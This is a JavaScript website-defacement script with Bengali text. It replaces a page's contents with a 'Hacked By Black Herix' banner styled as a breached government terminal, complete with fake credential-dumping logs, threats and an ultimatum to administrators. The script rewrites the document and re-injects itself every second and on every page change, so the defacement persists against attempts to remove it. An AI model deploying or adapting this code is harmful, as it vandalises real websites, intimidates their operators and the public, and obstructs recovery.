(function() {
    // নতুন ডিজাইন – GLITCHED GOVERNMENT TERMINAL
    const defaceHTML = `
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>GOV DATABASE :: BREACHED</title>
    <style>
        :root {
            --neon-pink: #ff007f;
            --cyan: #00ffff;
            --bg: #0a0a0a;
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100%; width: 100%; overflow-y: auto; overflow-x: hidden;
            background: var(--bg); color: var(--cyan); font-family: 'Courier New', monospace;
            cursor: crosshair;
        }

        .crt-scanlines {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999999; opacity: 0.15;
            background: repeating-linear-gradient(0deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 6px);
        }

        .glitch-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999998;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4" fill="rgba(0,0,0,0.7)"/><rect x="2" y="2" width="2" height="2" fill="rgba(255,0,127,0.3)"/></svg>');
            background-size: 4px 4px; opacity: 0.4;
        }

        .vignette {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 999997;
            background: radial-gradient(ellipse at center, rgba(0,0,0,0) 50%, rgba(0,0,0,0.9) 100%);
        }

        #matrix-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; pointer-events: none; opacity: 0.2;
        }

        .particles-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none;
        }

        .particle {
            position: absolute; color: var(--neon-pink); font-size: 1rem; opacity: 0;
            animation: floatUp 8s linear infinite; text-shadow: 0 0 8px var(--neon-pink);
        }

        @keyframes floatUp {
            0% { transform: translateY(110vh) translateX(0) rotate(0); opacity: 0; }
            10% { opacity: 0.8; }
            60% { opacity: 0.3; }
            100% { transform: translateY(-20vh) translateX(40px) rotate(270deg); opacity: 0; }
        }

        .wrapper {
            position: relative; z-index: 5; max-width: 720px; margin: 0 auto;
            padding: 20px 16px 40px; text-align: center; width: 100%; min-height: 100vh;
            display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
        }

        /* টার্মিনাল হেডার */
        .term-header {
            width: 100%; max-width: 600px; background: #000; border: 1px solid var(--cyan);
            padding: 8px 12px; margin-bottom: 20px; text-align: left; font-size: 0.65rem;
            color: var(--cyan); box-shadow: 0 0 20px rgba(0,255,255,0.2);
            display: flex; justify-content: space-between; align-items: center;
            letter-spacing: 1px;
        }
        .term-dots { display: flex; gap: 6px; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--neon-pink); box-shadow: 0 0 6px var(--neon-pink); }

        .badge {
            display: inline-block; padding: 4px 18px; background: rgba(255,0,127,0.15);
            border: 1px solid var(--neon-pink); color: var(--neon-pink); font-weight: bold;
            font-size: 0.7rem; letter-spacing: 3px; margin-bottom: 25px; text-shadow: 0 0 8px var(--neon-pink);
            animation: blink 1.5s infinite;
        }

        .target-card {
            background: rgba(10,10,10,0.8); border: 1px solid var(--cyan); padding: 10px;
            max-width: 220px; margin-bottom: 30px; box-shadow: 0 0 25px rgba(0,255,255,0.3);
            position: relative;
        }
        .target-card::before {
            content: "CLASSIFIED"; position: absolute; top: -14px; left: 50%; transform: translateX(-50%);
            background: var(--neon-pink); color: #000; padding: 2px 10px; font-size: 0.6rem;
            font-weight: bold; letter-spacing: 2px;
        }
        .target-img { width: 130px; height: 130px; object-fit: cover; display: block; filter: grayscale(0.3) contrast(1.2); }

        .glitch-title {
            font-size: 2rem; font-weight: 900; color: #fff; text-shadow: 2px 2px 0 var(--neon-pink), -2px -2px 0 var(--cyan);
            margin-bottom: 20px; letter-spacing: 2px; position: relative; display: inline-block;
            animation: glitchText 2s infinite;
        }
        @keyframes glitchText {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(2px, -2px); }
            60% { transform: translate(-1px, -1px); }
            80% { transform: translate(1px, 1px); }
        }

        .log-box {
            background: rgba(0,0,0,0.8); border: 1px dashed var(--cyan); padding: 18px 14px;
            max-width: 600px; width: 100%; margin-bottom: 25px; text-align: left;
            font-size: 0.8rem; line-height: 1.8; color: var(--cyan);
            box-shadow: inset 0 0 15px rgba(0,255,255,0.1); position: relative;
        }
        .log-box p { margin: 6px 0; }
        .log-box .cursor { display: inline-block; width: 8px; height: 15px; background: var(--neon-pink); animation: blink 0.8s infinite; vertical-align: middle; margin-left: 3px; }

        .demand-list {
            list-style: none; padding: 0; margin: 20px 0;
        }
        .demand-list li {
            color: var(--neon-pink); font-weight: bold; margin: 8px 0; font-size: 0.9rem;
            text-shadow: 0 0 6px var(--neon-pink); position: relative; padding-left: 25px;
        }
        .demand-list li::before {
            content: "▸"; position: absolute; left: 0; color: var(--cyan);
        }

        .ultimatum-box {
            background: #000; border: 2px solid var(--neon-pink); padding: 18px 10px;
            max-width: 600px; width: 100%; margin: 20px 0; color: #ffff00; font-weight: bold;
            text-shadow: 0 0 8px #ffff00; box-shadow: 0 0 30px rgba(255,0,127,0.3);
            position: relative;
        }
        .ultimatum-box::before {
            content: "⛔ ULTIMATUM ⛔"; position: absolute; top: -14px; left: 50%;
            transform: translateX(-50%); background: #000; padding: 2px 14px;
            color: #ffff00; font-size: 0.7rem; letter-spacing: 2px; border: 1px solid #ffff00;
        }

        .click-hint {
            margin-top: 15px; font-size: 0.7rem; color: #666; animation: blink 2s infinite;
            border-bottom: 1px dotted var(--cyan); padding-bottom: 4px;
        }

        .status-row {
            margin-top: 25px; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center;
            font-size: 0.6rem; color: var(--cyan); border-top: 1px solid #333; padding-top: 15px;
        }
        .status-row span { background: rgba(0,255,255,0.1); padding: 3px 10px; border-radius: 2px; }

        @media (min-width: 600px) {
            .glitch-title { font-size: 2.8rem; }
        }
    </style>
</head>
<body>
    <audio id="bg-music" loop preload="none">
        <source src="https://files.catbox.moe/tcj7j8.mp3" type="audio/mpeg">
    </audio>
    <div class="crt-scanlines"></div>
    <div class="glitch-overlay"></div>
    <div class="vignette"></div>
    <canvas id="matrix-canvas"></canvas>
    <div class="particles-container" id="particles-container"></div>

    <div class="wrapper">
        <div class="term-header">
            <span>root@gov-server:~#</span>
            <div class="term-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
            <span>CONN: ANONYMOUS</span>
        </div>
        <div class="badge">[ BREACH ACTIVE ]</div>

        <div class="target-card">
            <img src="https://i.ibb.co/ccrjKJh5/1000021966.jpg" alt="Target" class="target-img">
        </div>

        <h1 class="glitch-title">Hacked By Black Herix</h1>

        <div class="log-box">
            <p>> Initializing intrusion... <span style="color:#00ff00;">OK</span></p>
            <p>> Bypassing firewall... <span style="color:#00ff00;">OK</span></p>
            <p>> Dumping credentials... <span style="color:#ffff00;">IN PROGRESS</span><span class="cursor"></span></p>
            <p>> Message to admin: <span style="color:var(--neon-pink);">তোমাদের সিস্টেম চুরমার!</span></p>
        </div>

        <ul class="demand-list">
            <li>ডিজিটাল জগতে আমরা কারো কাছে ছোট নই।</li>
            <li>সরকারি ফাঁকফোকর আমরা বন্ধ করতেই পারি।</li>
            <li>এটা শুধু শুরু – বড় ধাক্কা এখনও বাকি।</li>
        </ul>

        <div class="ultimatum-box">
            প্রশাসনের উদ্দেশ্যে: সাইবার ডিফেন্স জোরদার করুন, নয়তো প্রতিবার আমরা আরও ভয়ংকর রূপে হাজির হবো। এটা কোনো হুমকি না – সত্যি বলছি।
        </div>

        <p class="click-hint">[ ক্লিক করো – সাইরেন বাজবে ]</p>

        <div class="status-row">
            <span>IP: SPOOFED</span>
            <span>TRACE: FAILED</span>
            <span>CREW: BLACK HERIX</span>
        </div>
    </div>
</body>
</html>
`;

    // ডম ওভাররাইট ইঞ্জিন (আগের মতোই)
    function injectDeface() {
        if (document.documentElement.innerHTML !== defaceHTML) {
            document.open();
            document.write(defaceHTML);
            document.close();
            startEffects();
        }
    }

    function startEffects() {
        const canvas = document.getElementById('matrix-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        let width, height, columns, drops, fontSize;
        let lastTime = 0;
        const fpsInterval = 1000 / 10;

        function resizeMatrix() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            fontSize = (width < 400) ? 10 : 14;
            columns = Math.floor(width / fontSize);
            drops = new Array(columns).fill(1);
        }

        function drawMatrix(timestamp) {
            if (timestamp - lastTime < fpsInterval) {
                requestAnimationFrame(drawMatrix);
                return;
            }
            lastTime = timestamp;
            ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
            ctx.fillRect(0, 0, width, height);
            ctx.fillStyle = '#ff007f'; // নিওন পিংক ম্যাট্রিক্স
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const char = String.fromCharCode(0x30A0 + Math.random() * 96);
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > height && Math.random() > 0.98) drops[i] = 0;
                drops[i]++;
            }
            requestAnimationFrame(drawMatrix);
        }
        resizeMatrix();
        requestAnimationFrame(drawMatrix);

        const container = document.getElementById('particles-container');
        const symbols = ['⚠', '☠', '✖', '⚡'];
        setInterval(() => {
            if (!container) return;
            const particle = document.createElement('span');
            particle.classList.add('particle');
            particle.textContent = symbols[Math.floor(Math.random() * symbols.length)];
            particle.style.left = Math.random() * 90 + '%';
            particle.style.animationDuration = (Math.random() * 6 + 5) + 's';
            container.appendChild(particle);
            setTimeout(() => particle.remove(), 8000);
        }, 2500);
    }

    injectDeface();
    setInterval(injectDeface, 1000);
    const observer = new MutationObserver(injectDeface);
    observer.observe(document.documentElement, { childList: true, subtree: true });

    document.addEventListener('click', function() {
        const audio = document.getElementById('bg-music');
        if (audio) { audio.play().catch(e => console.log("Audio blocked")); }
    });
})();
